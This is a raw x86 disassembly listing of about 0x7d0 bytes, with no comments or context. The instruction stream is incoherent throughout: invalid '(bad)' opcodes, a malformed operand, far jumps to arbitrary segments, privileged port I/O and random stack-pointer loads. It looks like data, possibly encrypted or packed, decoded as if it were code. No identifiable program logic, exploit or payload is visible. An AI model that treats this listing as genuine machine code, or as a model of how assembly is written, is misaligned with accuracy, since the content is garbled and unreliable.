  420cd2:	mov    bh,BYTE PTR ds:0xfe341c7d
  420cd8:	imul   esi,DWORD PTR [ebx-0x27],0x1
  420cdc:	and    esp,ecx
  420cde:	pop    eax
  420cdf:	adc    DWORD PTR [eax+edx*2+0x6a5d2f8c],esi
  420ce6:	test   esp,edx
  420ce8:	dec    ecx
  420ce9:	jmp    0xa2e3:0x6ac6122e
  420cf0:	in     al,dx
  420cf1:	sub    eax,0x9a72a820
  420cf6:	mov    ebx,0x91d74b8
  420cfb:	sub    DWORD PTR [ebp-0x4cc7bfa5],edi
  420d01:	pop    edi
  420d02:	bt     DWORD PTR [esi-0x7],ecx
  420d06:	fild   DWORD PTR [edx-0x319cdd62]
  420d0c:	mov    cl,BYTE PTR [ebp+0x66]
  420d0f:	mov    eax,0xca40f56c
  420d14:	adc    eax,0x566b337e
  420d19:	mov    esp,0x732edd6e
  420d1e:	mov    bh,0x2b
  420d20:	xlat   BYTE PTR ds:[ebx]
  420d21:	dec    esi
  420d22:	xchg   BYTE PTR [eax],bl
  420d24:	repnz or eax,0xde34d9b9
  420d2a:	scas   al,BYTE PTR es:[edi]
  420d2b:	clc    
  420d2c:	push   0xc815f05b
  420d31:	ror    BYTE PTR [edx+ebx*4],cl
  420d34:	and    esi,esp
  420d36:	or     al,0xc
  420d38:	sub    eax,ebp
  420d3a:	imul   eax,DWORD PTR [ebx-0x73bd195e],0x9f1ba2af
  420d44:	xchg   DWORD PTR [edx+0x2dc733],esi
  420d4a:	lahf   
  420d4b:	xor    DWORD PTR [ecx-0xfa45a05],0x581d928
  420d55:	fiadd  WORD PTR [edi-0x4]
  420d58:	leave  
  420d59:	lea    edx,[ebx+0x5c]
  420d5c:	push   edi
  420d5d:	or     ecx,edx
  420d5f:	outs   dx,DWORD PTR ds:[esi]
  420d60:	int    0xb3
  420d62:	sbb    edx,edi
  420d64:	fimul  DWORD PTR [edx]
  420d66:	sub    ebp,ebp
  420d68:	sar    BYTE PTR [esi+0x78249ec6],cl
  420d6e:	shr    BYTE PTR ds:0xec4a76b3,1
  420d74:	push   esi
  420d75:	push   edi
  420d76:	leave  
  420d77:	adc    al,0x76
  420d79:	call   0x3379dc5
  420d7e:	fucomi st,st(4)
  420d80:	ffreep st(5)
  420d82:	pop    ecx
  420d83:	fisub  DWORD PTR [eax+0x4d]
  420d86:	mov    ?,WORD PTR [edx+0x73]
  420d89:	cs push eax
  420d8b:	sbb    eax,0x829317ff
  420d90:	or     ebp,ebp
  420d92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d93:	adc    ebx,DWORD PTR [edi]
  420d95:	push   es
  420d96:	mov    DWORD PTR [eax+eax*1],edx
  420d99:	dec    eax
  420d9a:	jle    0x420d70
  420d9c:	jne    0x420da3
  420d9e:	ins    BYTE PTR es:[edi],dx
  420d9f:	cs repz out 0x4,eax
  420da3:	das    
  420da4:	xchg   esp,eax
  420da5:	test   BYTE PTR [ecx-0x7],bl
  420da8:	mov    bl,dh
  420daa:	mov    al,ds:0x2a496dcc
  420daf:	fsubp  st(5),st
  420db1:	sub    eax,0xe64bfbbd
  420db6:	dec    edx
  420db7:	xor    cl,cl
  420db9:	loop   0x420d5a
  420dbb:	in     al,0x2c
  420dbd:	ins    DWORD PTR es:[edi],dx
  420dbe:	ret    
  420dbf:	jno    0x420dd1
  420dc1:	or     dl,al
  420dc3:	push   eax
  420dc4:	lahf   
  420dc5:	lahf   
  420dc6:	call   0xa4ec5cb2
  420dcb:	into   
  420dcc:	mov    WORD PTR [ebx+esi*4+0x27],cs
  420dd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dd1:	jnp    0x420dc2
  420dd3:	stc    
  420dd4:	popa   
  420dd5:	cmp    bl,ch
  420dd7:	mov    dh,0x31
  420dd9:	out    dx,eax
  420dda:	jbe    0x420e0e
  420ddc:	xchg   ebx,eax
  420ddd:	fild   QWORD PTR [ebx]
  420ddf:	and    al,0x4a
  420de1:	push   edi
  420de2:	xor    BYTE PTR [ebp-0x6c],dh
  420de5:	dec    ebp
  420de6:	adc    DWORD PTR [ebx-0x2a9c5439],0x17
  420ded:	and    eax,0xc1865e42
  420df2:	xor    al,0x30
  420df4:	sbb    DWORD PTR [edx+0x1b],esp
  420df7:	hlt    
  420df8:	mov    esp,0x14a24d2d
  420dfd:	dec    esp
  420dfe:	fild   WORD PTR ds:0x45d48387
  420e04:	ja     0x420db4
  420e06:	aad    0x11
  420e08:	mov    cl,BYTE PTR [esi]
  420e0a:	int3   
  420e0b:	inc    ebx
  420e0c:	and    BYTE PTR [ebx-0xc],cl
  420e0f:	imul   esi,DWORD PTR [esi+0x45],0x7b81936c
  420e16:	pop    esi
  420e17:	jmp    0x37a217bf
  420e1c:	fs cld 
  420e1e:	retf   
  420e1f:	aas    
  420e20:	push   esi
  420e21:	add    BYTE PTR [esi],0xa6
  420e24:	les    edx,FWORD PTR [ebx-0x6f96e0b8]
  420e2a:	and    eax,0x544ecde9
  420e2f:	xchg   esi,eax
  420e30:	cwde   
  420e31:	add    al,0x6e
  420e33:	outs   dx,BYTE PTR ds:[esi]
  420e34:	sub    eax,0xfec8a999
  420e39:	test   eax,0x6b80ffd0
  420e3e:	mov    ds:0xfc2a7b44,al
  420e43:	mov    eax,0x98199ea3
  420e48:	les    edx,FWORD PTR [esi]
  420e4a:	es jno 0x420de0
  420e4d:	gs stos BYTE PTR es:[edi],al
  420e4f:	or     al,0x92
  420e51:	ins    DWORD PTR es:[edi],dx
  420e52:	jl     0x420e01
  420e54:	mov    eax,0x28a87c27
  420e59:	lahf   
  420e5a:	mov    edx,0xf19e015c
  420e5f:	sub    edx,DWORD PTR [ecx]
  420e61:	gs jecxz 0x420e52
  420e64:	dec    esi
  420e65:	maskmovq mm4,(bad)
  420e66:	mul    DWORD PTR [ebp-0x154a2653]
  420e6c:	fisttp QWORD PTR [eax]
  420e6e:	xchg   ebx,eax
  420e6f:	cmp    eax,0x56890681
  420e74:	dec    ebx
  420e75:	(bad)  [ebx-0x69be2800]
  420e7b:	jnp    0x420eac
  420e7d:	inc    ecx
  420e7e:	rcr    BYTE PTR [ebx],cl
  420e80:	and    ebx,DWORD PTR [edx-0x22a56be5]
  420e86:	lock aad 0xd
  420e89:	(bad)  
  420e8a:	aaa    
  420e8b:	or     DWORD PTR [ebx+edi*8-0x3],esp
  420e8f:	cwde   
  420e90:	xchg   ecx,eax
  420e91:	aam    0x7b
  420e93:	popf   
  420e94:	push   esp
  420e95:	add    DWORD PTR [edx+0xccfbe28],eax
  420e9b:	scas   eax,DWORD PTR es:[edi]
  420e9c:	mov    ah,0xa
  420e9e:	sub    cl,BYTE PTR ds:0x1ec7ee75
  420ea4:	xor    DWORD PTR [esi+0x6332746c],edi
  420eaa:	push   0x9ee4a08e
  420eaf:	push   ecx
  420eb0:	cmp    al,0x10
  420eb2:	jmp    0xc873:0xe50c76f4
  420eb9:	ret    0x90d8
  420ebc:	dec    esi
  420ebd:	or     DWORD PTR [ebp+edi*2+0x2240440b],eax
  420ec4:	cmp    ecx,ecx
  420ec6:	or     al,0xbb
  420ec8:	inc    esi
  420ec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420eca:	sbb    DWORD PTR [ebx+0x18],edi
  420ecd:	xchg   edi,eax
  420ece:	adc    BYTE PTR [edx+0x7a30b7f6],ah
  420ed4:	add    DWORD PTR [edi+0x50b1db8a],ebp
  420eda:	cwde   
  420edb:	ficom  WORD PTR [eax]
  420edd:	and    ch,BYTE PTR [eax]
  420edf:	xor    esp,DWORD PTR [edi-0x52f4fb72]
  420ee5:	pop    ebx
  420ee6:	mov    dl,0x87
  420ee8:	xor    eax,0x9efc6e98
  420eed:	jp     0x420f39
  420eef:	mov    al,0xd9
  420ef1:	dec    ecx
  420ef2:	aaa    
  420ef3:	popa   
  420ef4:	(bad)  [ebp-0x4e0f7935]
  420efa:	dec    esp
  420efb:	pop    ss
  420efc:	(bad)  
  420efd:	(bad)  
  420efe:	mov    ecx,0xa9102303
  420f03:	mov    esi,0x43a8a0e7
  420f08:	mov    eax,0x640986ef
  420f0d:	aad    0xd6
  420f0f:	int3   
  420f10:	cmp    dh,BYTE PTR fs:[edi]
  420f13:	cmp    bh,BYTE PTR [ebx+0x41]
  420f16:	outs   dx,DWORD PTR ds:[esi]
  420f17:	pop    eax
  420f18:	cmc    
  420f19:	mov    eax,0x806a72b2
  420f1e:	lds    esp,FWORD PTR [esi+0x3c]
  420f21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f22:	dec    esp
  420f23:	push   esp
  420f24:	mov    esi,0xd9807c57
  420f29:	inc    esi
  420f2a:	dec    ebx
  420f2b:	and    edi,DWORD PTR gs:[edi+0x2498c948]
  420f32:	dec    esp
  420f33:	or     al,0x42
  420f35:	jmp    0x78ee3757
  420f3a:	aad    0x35
  420f3c:	dec    ebp
  420f3d:	mov    ecx,0x52f2c008
  420f42:	stc    
  420f43:	das    
  420f44:	sub    eax,DWORD PTR [eax]
  420f46:	and    BYTE PTR [edi-0x52],0xd4
  420f4a:	mov    cl,0xa5
  420f4c:	neg    BYTE PTR [esi-0x41b8de3f]
  420f52:	push   ds
  420f53:	ficom  DWORD PTR ds:0x4a1824dd
  420f59:	push   es
  420f5a:	call   0x2670:0x2318dc77
  420f61:	xchg   edi,eax
  420f62:	fstp   DWORD PTR [edx+ebp*4]
  420f65:	scas   eax,DWORD PTR es:[edi]
  420f66:	sbb    al,0x55
  420f68:	adc    DWORD PTR [edi+0x6a],esi
  420f6b:	push   ebp
  420f6c:	ficom  DWORD PTR [ecx+0x25]
  420f6f:	push   ss
  420f70:	or     esp,DWORD PTR [edi+0x71aeaa1a]
  420f76:	or     DWORD PTR [edx-0x3cde6591],edi
  420f7c:	imul   eax,DWORD PTR [ebp+0x1e6191b6],0x51d9559b
  420f86:	and    BYTE PTR [eax],dl
  420f88:	xchg   ebp,eax
  420f89:	xlat   BYTE PTR ds:[ebx]
  420f8a:	ds and eax,0xc979a77f
  420f90:	jmp    0xa500:0x8c94d8b1
  420f97:	call   esp
  420f99:	or     DWORD PTR [ebp-0x2d],edi
  420f9c:	call   FWORD PTR [eax+ebx*2]
  420f9f:	sti    
  420fa0:	std    
  420fa1:	stc    
  420fa2:	outs   dx,BYTE PTR ds:[esi]
  420fa3:	mov    ebx,ebp
  420fa5:	sti    
  420fa6:	inc    ebx
  420fa7:	lds    esp,FWORD PTR [ebp-0x4c]
  420faa:	retf   0x7e92
  420fad:	retf   0xfb56
  420fb0:	mov    cl,cl
  420fb2:	outs   dx,DWORD PTR ds:[esi]
  420fb3:	rep outs dx,BYTE PTR ds:[esi]
  420fb5:	es mov ebp,0x160af30b
  420fbb:	(bad)  
  420fbc:	stc    
  420fbd:	mov    esp,0x61544bc7
  420fc2:	cdq    
  420fc3:	scas   eax,DWORD PTR es:[edi]
  420fc4:	sub    dl,BYTE PTR [edi-0x4b8b3aed]
  420fca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fcb:	add    BYTE PTR [edi+0x2f57962],ch
  420fd1:	jns    0x420fcc
  420fd3:	fdiv   DWORD PTR [edi-0x27]
  420fd6:	pop    ecx
  420fd7:	adc    esi,edi
  420fd9:	xlat   BYTE PTR ds:[bx]
  420fdb:	imul   DWORD PTR [edi+0x2b]
  420fde:	gs dec ebx
  420fe0:	xor    al,0x38
  420fe2:	pusha  
  420fe3:	sbb    ecx,esi
  420fe5:	jno    0x420fdb
  420fe7:	jl     0x420fb5
  420fe9:	fist   DWORD PTR [esp+eax*4+0xa]
  420fed:	inc    edi
  420fee:	adc    eax,0xe0fa934e
  420ff3:	sbb    esp,DWORD PTR [eax-0x2]
  420ff6:	(bad)  
  420ff7:	xor    BYTE PTR [ebx+0x5b],ch
  420ffa:	das    
  420ffb:	jg     0x420f87
  420ffd:	jae    0x420f98
  420fff:	xchg   esp,esp
  421001:	fmul   st,st(2)
  421003:	xor    ecx,DWORD PTR [ebp-0x37]
  421006:	fsub   QWORD PTR [eax+0x60]
  421009:	ret    
  42100a:	dec    esi
  42100b:	jle    0x420f91
  42100d:	push   DWORD PTR [ecx-0x67fda9e2]
  421013:	arpl   WORD PTR [ebx-0x19],ax
  421016:	sub    al,0xd4
  421018:	sub    eax,0x11af86ae
  42101d:	mov    esp,0x120cf20
  421022:	inc    esi
  421023:	daa    
  421024:	push   esp
  421025:	pop    edx
  421026:	inc    esp
  421027:	aas    
  421028:	cdq    
  421029:	hlt    
  42102a:	mov    ds:0xc508aab8,al
  42102f:	fidivr WORD PTR ds:0x6bc431cd
  421035:	push   cs
  421036:	mov    esi,0xcbdaf3ee
  42103b:	aaa    
  42103c:	and    BYTE PTR [esi+0x29],bl
  42103f:	daa    
  421040:	mov    eax,0xf8c90516
  421045:	mov    ecx,esp
  421047:	or     edx,esi
  421049:	cmc    
  42104a:	pop    ss
  42104b:	mov    ebx,0x5f0edd81
  421050:	mov    ebx,0xd53a7174
  421055:	dec    esp
  421056:	xor    eax,0xc02e7772
  42105b:	shr    DWORD PTR [ecx-0x199c279e],0x99
  421062:	cmp    eax,0xd8da5649
  421067:	cld    
  421068:	pop    ss
  421069:	push   esi
  42106a:	push   ebp
  42106b:	cwde   
  42106c:	sahf   
  42106d:	loope  0x421000
  42106f:	pop    edx
  421070:	js     0x4210e1
  421072:	xchg   ecx,eax
  421073:	jp     0x421072
  421075:	out    0x25,eax
  421077:	test   eax,0x88c24fbb
  42107c:	inc    esp
  42107d:	sbb    esp,DWORD PTR [eax]
  42107f:	pop    esp
  421080:	sbb    eax,0x14facf37
  421085:	aad    0xc1
  421087:	mov    WORD PTR [edi-0x719ba0b7],cs
  42108d:	mov    dl,0x57
  42108f:	or     al,0x7b
  421091:	je     0x42102b
  421093:	test   eax,0x3cacc492
  421098:	jmp    0xd6f8707a
  42109d:	ss pop es
  42109f:	mov    edi,0xa0bf962f
  4210a4:	pushf  
  4210a5:	scas   eax,DWORD PTR es:[edi]
  4210a6:	ins    DWORD PTR es:[edi],dx
  4210a7:	push   es
  4210a8:	push   esp
  4210a9:	sub    eax,0x670f6221
  4210ae:	inc    eax
  4210af:	inc    edx
  4210b0:	fwait
  4210b1:	int3   
  4210b2:	fisttp DWORD PTR [ebp-0x23]
  4210b5:	dec    DWORD PTR [edx]
  4210b7:	jl     0x421138
  4210b9:	jbe    0x4210b1
  4210bb:	sbb    eax,0xb0cb0bd1
  4210c0:	adc    ch,0x6d
  4210c3:	aas    
  4210c4:	add    DWORD PTR [esi+edi*4-0x6f23a487],eax
  4210cb:	mov    ebx,0xb09b84
  4210d0:	nop
  4210d1:	into   
  4210d2:	add    DWORD PTR [ebx+eax*1-0xe],edx
  4210d6:	aam    0xe3
  4210d8:	mov    cs,WORD PTR [edx+0x42]
  4210db:	jbe    0x4210ca
  4210dd:	and    DWORD PTR [ecx],esp
  4210df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210e0:	shl    DWORD PTR [edx],cl
  4210e2:	mov    BYTE PTR [ebx-0x27],dh
  4210e5:	lods   eax,DWORD PTR ds:[esi]
  4210e6:	arpl   WORD PTR [esi+0x4e3005ce],si
  4210ec:	bound  eax,QWORD PTR ds:0xef5a5a5c
  4210f2:	leave  
  4210f3:	sub    dh,al
  4210f5:	or     esi,ecx
  4210f7:	jle    0x421098
  4210f9:	sahf   
  4210fa:	test   al,0x93
  4210fc:	mov    eax,ds:0x89971261
  421101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421102:	mov    esi,0x961f21c9
  421107:	sbb    bh,BYTE PTR [ebp-0x65c0f32d]
  42110d:	scas   eax,DWORD PTR es:[edi]
  42110e:	push   ebx
  42110f:	cs das 
  421111:	pop    eax
  421112:	int    0x6e
  421114:	jp     0x4210c1
  421116:	sub    al,0xe7
  421118:	xchg   esi,eax
  421119:	jmp    0xa720:0x394b30c2
  421120:	jecxz  0x4210b2
  421122:	add    ecx,eax
  421124:	mov    al,0x5d
  421126:	xor    ebp,DWORD PTR [eax-0x71ecdf7b]
  42112c:	ins    DWORD PTR es:[edi],dx
  42112d:	mov    ch,0x92
  42112f:	mov    ecx,0xc72356cb
  421134:	xchg   ebx,eax
  421135:	rcr    DWORD PTR [ebp+0x25f2ae8d],cl
  42113b:	mov    bh,BYTE PTR [edx+0x5581c82f]
  421141:	fs (bad) 
  421144:	jp     0x4210f1
  421146:	add    dl,bh
  421148:	xchg   edx,ebp
  42114a:	xor    edi,DWORD PTR [edi]
  42114c:	in     eax,0x95
  42114e:	(bad)  fs:[ebx]
  421151:	scas   al,BYTE PTR es:[edi]
  421152:	pop    eax
  421153:	cs mov bl,0x7f
  421156:	add    ebx,DWORD PTR [ecx+0x3dcb3a0d]
  42115c:	cmp    dh,cl
  42115e:	pop    eax
  42115f:	sub    al,0x25
  421161:	lock inc esp
  421163:	dec    esp
  421164:	arpl   WORD PTR [edx+0x4b],sp
  421167:	mov    ah,0xb9
  421169:	jmp    0x42116e
  42116b:	stc    
  42116c:	(bad)  
  42116d:	out    0xfc,al
  42116f:	lods   eax,DWORD PTR ds:[esi]
  421170:	push   0xdc89e632
  421175:	jmp    0x4211d6
  421177:	push   cs
  421178:	ja     0x4211e0
  42117a:	add    DWORD PTR [ecx],edx
  42117c:	dec    esp
  42117d:	jge    0x4211d4
  42117f:	sub    eax,0xbe7f4e4d
  421184:	lods   al,BYTE PTR ds:[esi]
  421185:	and    DWORD PTR [edi+0x50],edi
  421188:	das    
  421189:	push   ebx
  42118a:	popa   
  42118b:	lods   al,BYTE PTR ds:[esi]
  42118c:	cmp    BYTE PTR [ebp+0x5f],dl
  42118f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421190:	pop    esi
  421191:	sub    DWORD PTR [eax-0x19f57130],esp
  421197:	mov    ch,0x65
  421199:	sub    al,0xa2
  42119b:	mov    ebx,0x64a49768
  4211a0:	scas   eax,DWORD PTR es:[edi]
  4211a1:	pop    ecx
  4211a2:	push   esi
  4211a3:	xchg   DWORD PTR [edx],eax
  4211a5:	cs xchg ebx,eax
  4211a7:	cmp    eax,0xa4d72663
  4211ac:	rol    BYTE PTR [esi-0x3b],cl
  4211af:	xchg   ebx,eax
  4211b0:	popa   
  4211b1:	(bad)  
  4211b2:	push   edi
  4211b3:	xor    eax,0xada32ab4
  4211b8:	mov    al,BYTE PTR [edx-0x3fd24ca5]
  4211be:	push   esi
  4211bf:	mov    esp,0x6782b9dc
  4211c4:	js     0x42119b
  4211c6:	xchg   edi,eax
  4211c7:	sbb    BYTE PTR [edx+0x6efee1be],cl
  4211cd:	mov    al,ds:0x49dbd9a7
  4211d2:	int    0xb0
  4211d4:	or     eax,0xbfac56d2
  4211d9:	fiadd  WORD PTR [edi-0x3b]
  4211dc:	jle    0x421244
  4211de:	retf   0x8a2
  4211e1:	out    dx,al
  4211e2:	hlt    
  4211e3:	push   ebx
  4211e4:	lods   al,BYTE PTR ds:[esi]
  4211e5:	lock adc al,0x78
  4211e8:	mov    dh,0x3a
  4211ea:	(bad)  
  4211eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211ec:	and    dh,dh
  4211ee:	adc    eax,0xbb26c731
  4211f3:	stos   BYTE PTR es:[edi],al
  4211f4:	mov    cl,0xbb
  4211f6:	xlat   BYTE PTR ds:[ebx]
  4211f7:	mov    cl,BYTE PTR [ebp+0x8]
  4211fa:	popa   
  4211fb:	popf   
  4211fc:	adc    ah,ch
  4211fe:	push   esp
  4211ff:	pusha  
  421200:	fcom   st(2)
  421202:	push   ds
  421203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421204:	mov    ebp,DWORD PTR [ecx+0x653d3c51]
  42120a:	cli    
  42120b:	jmp    0x42121f
  42120d:	adc    DWORD PTR [eax+0x1e4510d5],esi
  421213:	out    0x7d,eax
  421215:	jmp    0x4211f4
  421217:	ins    BYTE PTR es:[edi],dx
  421218:	or     al,0x5
  42121a:	add    BYTE PTR [edi+0x7b],0x3c
  42121e:	mov    al,0x3f
  421220:	add    ecx,0x1d
  421223:	xor    dh,BYTE PTR [ebx+0x41]
  421226:	sub    bl,BYTE PTR [edi+ebp*1+0x3c5ad8e5]
  42122d:	scas   al,BYTE PTR es:[edi]
  42122e:	jle    0x4211c5
  421230:	xchg   ebx,eax
  421231:	sub    bl,al
  421233:	mov    WORD PTR [ecx+0x17e00eb0],ds
  421239:	jp     0x42124f
  42123b:	push   ebx
  42123c:	loop   0x4211e5
  42123e:	mov    ebp,DWORD PTR [edi]
  421240:	mov    ds:0x1d95e6f,eax
  421245:	dec    edx
  421246:	push   esp
  421247:	xor    ecx,DWORD PTR [ecx+0x67699f7b]
  42124d:	push   eax
  42124e:	imul   edx,DWORD PTR [edx+edx*1-0x45],0x70
  421253:	sub    BYTE PTR [ecx],0x9a
  421256:	pop    esp
  421257:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421258:	pushf  
  421259:	xchg   edx,eax
  42125a:	adc    al,0x8f
  42125c:	xor    al,0xf7
  42125e:	repnz dec esp
  421260:	loopne 0x4212b8
  421262:	mov    eax,ds:0x9695febf
  421267:	mov    esp,ebp
  421269:	out    0x1e,al
  42126b:	xchg   edx,eax
  42126c:	loope  0x4212df
  42126e:	sub    al,0xbe
  421270:	add    DWORD PTR [edx+0xa],ecx
  421273:	inc    eax
  421274:	bound  edi,QWORD PTR [eax]
  421276:	test   ebx,edi
  421278:	jecxz  0x4212d8
  42127a:	outs   dx,DWORD PTR ds:[esi]
  42127b:	pop    es
  42127c:	mov    edi,0x6b86276f
  421281:	adc    al,dh
  421283:	add    al,0x4c
  421285:	sub    al,0x99
  421287:	jg     0x421258
  421289:	aaa    
  42128a:	cmp    BYTE PTR [edx],cl
  42128c:	scas   eax,DWORD PTR es:[edi]
  42128d:	mov    es,edi
  42128f:	retf   
  421290:	(bad)  
  421291:	aam    0xe8
  421293:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421294:	out    0x98,eax
  421296:	and    eax,0x54cda33c
  42129b:	rol    DWORD PTR [edi+0x71],cl
  42129e:	rcl    DWORD PTR [edi],0x5e
  4212a1:	and    eax,0xd295837c
  4212a6:	(bad)  
  4212a7:	std    
  4212a8:	pop    eax
  4212a9:	mov    ds:0x9614c469,al
  4212ae:	cmp    al,0xac
  4212b0:	pusha  
  4212b1:	mov    edi,0xceb80b41
  4212b6:	xor    dl,bh
  4212b8:	push   edx
  4212b9:	inc    ebp
  4212ba:	pop    edx
  4212bb:	iret   
  4212bc:	and    BYTE PTR [ebx+0x3c704a55],al
  4212c2:	das    
  4212c3:	pushf  
  4212c4:	ja     0x421313
  4212c6:	inc    BYTE PTR [eax-0x6]
  4212c9:	inc    ebp
  4212ca:	mov    ds:0x689a7d1c,eax
  4212cf:	aas    
  4212d0:	shr    BYTE PTR [edi+0x2b],cl
  4212d3:	arpl   WORD PTR [ebp+0x4f],si
  4212d6:	or     dl,al
  4212d8:	pause  
  4212da:	bound  edi,QWORD PTR [eax-0x424b8d7f]
  4212e0:	fwait
  4212e1:	stos   DWORD PTR es:[edi],eax
  4212e2:	add    DWORD PTR [edi],ecx
  4212e4:	and    dh,dh
  4212e6:	in     eax,0xff
  4212e8:	test   DWORD PTR [ebx-0xbeef3ed],esi
  4212ee:	push   ecx
  4212ef:	out    dx,eax
  4212f0:	jns    0x421289
  4212f2:	rcr    DWORD PTR [esp+ecx*2],0xc4
  4212f6:	mov    edi,0x6601d30b
  4212fb:	into   
  4212fc:	xchg   BYTE PTR [esi-0x72f6d73a],al
  421302:	mov    es,WORD PTR [ebx+esi*1]
  421305:	mov    dh,0xb1
  421307:	pop    edi
  421308:	lods   al,BYTE PTR ds:[esi]
  421309:	pop    ss
  42130a:	fisubr WORD PTR [esi+0x37]
  42130d:	adc    al,0x42
  42130f:	lods   al,BYTE PTR ds:[esi]
  421310:	std    
  421311:	dec    eax
  421312:	out    0xe6,al
  421314:	sbb    al,0x6
  421316:	mov    dl,0xba
  421318:	ret    0xc124
  42131b:	dec    ecx
  42131c:	sti    
  42131d:	mov    esp,0xf544cc08
  421322:	ret    
  421323:	mov    edx,0xc59f1967
  421328:	(bad)  
  421329:	push   esi
  42132a:	(bad)  
  42132c:	add    BYTE PTR [ebx-0x243d157],0x6f
  421333:	lahf   
  421334:	mov    cs,WORD PTR [edi]
  421336:	cwd    
  421338:	jge    0x4213a0
  42133a:	dec    ebx
  42133b:	cmp    edx,ecx
  42133d:	not    DWORD PTR [ebp+0x36d8aa67]
  421343:	sbb    BYTE PTR [ebp+0x4c7127c4],dl
  421349:	or     DWORD PTR [edx+0x3354f299],0x82e82739
  421353:	pop    ecx
  421354:	add    edx,eax
  421356:	rcr    al,0x3e
  421359:	add    eax,0xb28c86fc
  42135e:	(bad)  
  42135f:	std    
  421360:	push   edi
  421361:	call   0x96e7a200
  421366:	cmp    eax,0x1b6d560f
  42136b:	or     DWORD PTR [edx-0x16],ebx
  42136e:	jge    0x42139f
  421370:	and    DWORD PTR [edi],esi
  421372:	hlt    
  421373:	mov    eax,ds:0xdf8bc1a2
  421378:	les    edi,FWORD PTR [ebx]
  42137a:	inc    ebx
  42137b:	or     eax,0x9a00895b
  421380:	mov    edi,0x89eb022f
  421385:	test   DWORD PTR [edx-0x1882e5df],0xed670b79
  42138f:	sbb    DWORD PTR [edi],esp
  421391:	jae    0x421348
  421393:	cwde   
  421394:	scas   eax,DWORD PTR es:[edi]
  421395:	sub    eax,DWORD PTR [eax]
  421397:	mov    ebp,0xf7cee04a
  42139c:	lods   al,BYTE PTR ds:[esi]
  42139d:	stc    
  42139e:	cmp    al,0x4e
  4213a0:	xor    cl,bh
  4213a2:	fldenv [eax+0x50f82013]
  4213a8:	call   FWORD PTR [edx]
  4213aa:	inc    edi
  4213ab:	call   0xf2540eee
  4213b0:	mov    ebx,0xf34bcab0
  4213b5:	xor    al,0xd5
  4213b7:	imul   eax,DWORD PTR [eax+0x6c],0xffffff8b
  4213bb:	leave  
  4213bc:	sbb    DWORD PTR [ebx+0x26],ecx
  4213bf:	xchg   esi,eax
  4213c0:	stos   DWORD PTR es:[edi],eax
  4213c1:	ins    DWORD PTR es:[edi],dx
  4213c2:	mov    dl,0x54
  4213c4:	retf   
  4213c5:	(bad)  
  4213c6:	xchg   edx,eax
  4213c7:	dec    ebx
  4213c8:	outs   dx,DWORD PTR ds:[esi]
  4213c9:	ins    BYTE PTR es:[edi],dx
  4213ca:	iret   
  4213cb:	(bad)  
  4213cc:	mov    bl,0x49
  4213ce:	aad    0xc9
  4213d0:	or     esi,DWORD PTR [ebp+0x52]
  4213d3:	ret    0x3261
  4213d6:	nop
  4213d7:	dec    edi
  4213d8:	adc    al,0xbc
  4213da:	jl     0x4213b9
  4213dc:	fwait
  4213dd:	loop   0x421362
  4213df:	cmp    cl,al
  4213e1:	and    al,0xa1
  4213e3:	sbb    ebp,DWORD PTR [eax+0x40]
  4213e6:	or     DWORD PTR ds:0xa1435c42,ecx
  4213ec:	mov    cl,BYTE PTR [edi-0x4394fde5]
  4213f2:	clc    
  4213f3:	dec    edi
  4213f4:	jmp    0x4388:0x8ba0aec8
  4213fb:	mov    esi,0x7ab1398f
  421400:	mov    al,ds:0xb071f5d4
  421405:	xchg   esp,eax
  421406:	add    BYTE PTR [eax+0x38],dh
  421409:	fmul   DWORD PTR [esp+esi*2-0x12]
  42140d:	in     al,0xca
  42140f:	shl    DWORD PTR [eax-0x979ca5],1
  421415:	jno    0x4213e4
  421417:	and    al,0x50
  421419:	adc    al,0x29
  42141b:	fwait
  42141c:	dec    ecx
  42141d:	inc    ecx
  42141e:	sub    ebx,DWORD PTR [ecx-0x56]
  421421:	nop
  421422:	cdq    
  421423:	jmp    0x421476
  421425:	cmp    al,0x8c
  421427:	or     DWORD PTR [esi],0x65
  42142a:	and    al,0x8
  42142c:	nop
  42142d:	fadd   st(0),st
  42142f:	sub    DWORD PTR [edi],0xe7247d78
  421435:	pushf  
  421436:	xchg   edi,eax
  421437:	ja     0x4213cb
  421439:	cmp    BYTE PTR [ebp-0x1df379cb],ah
  42143f:	fcmove st,st(5)
  421441:	mov    DWORD PTR [edx],edi
  421443:	inc    edx
  421444:	dec    esi
  421445:	fist   WORD PTR [esi+eiz*4-0x75]
  421449:	in     eax,dx
  42144a:	pop    ebx
  42144b:	sti    
  42144c:	push   cs
  42144d:	mov    ecx,0xcc0ccde1
  421452:	jnp    0x4213dc
  421454:	mov    esp,DWORD PTR [esi-0x32e7d9cc]
  42145a:	add    BYTE PTR [eax],dl
  42145c:	adc    al,0x20
  42145e:	test   eax,0x2d40e1ce
  421463:	idiv   BYTE PTR [edi+0x29bda724]
  421469:	mov    al,ds:0x9ab5d39d
  42146e:	dec    eax
  42146f:	xor    ch,bl
  421471:	adc    BYTE PTR [eax-0x6863486c],bl
  421477:	ds ret 
  421479:	pop    es
  42147a:	push   ebx
  42147b:	dec    cx
  42147d:	(bad)  
  42147e:	cld    
  42147f:	push   ebx
  421480:	dec    esi
  421481:	mov    eax,0x42f7a0e2
  421486:	jbe    0x421499
  421488:	sub    eax,DWORD PTR [eax-0x11]
  42148b:	js     0x4214e6
  42148d:	mov    bh,0x2f
  42148f:	sub    DWORD PTR [edi],ebp
  421491:	and    dh,BYTE PTR [esi]
  421493:	inc    ebp
  421494:	test   DWORD PTR [ebp+0x6a],eax
  421497:	xchg   ebp,eax
  421498:	mov    eax,0x30a0a1da
  42149d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42149e:	fimul  DWORD PTR [edx]
  4214a0:	cmp    al,0x19
  4214a2:	mov    al,ds:0x88412e91
  4214a7:	inc    ebx
  4214a8:	mov    esi,0x111b834a
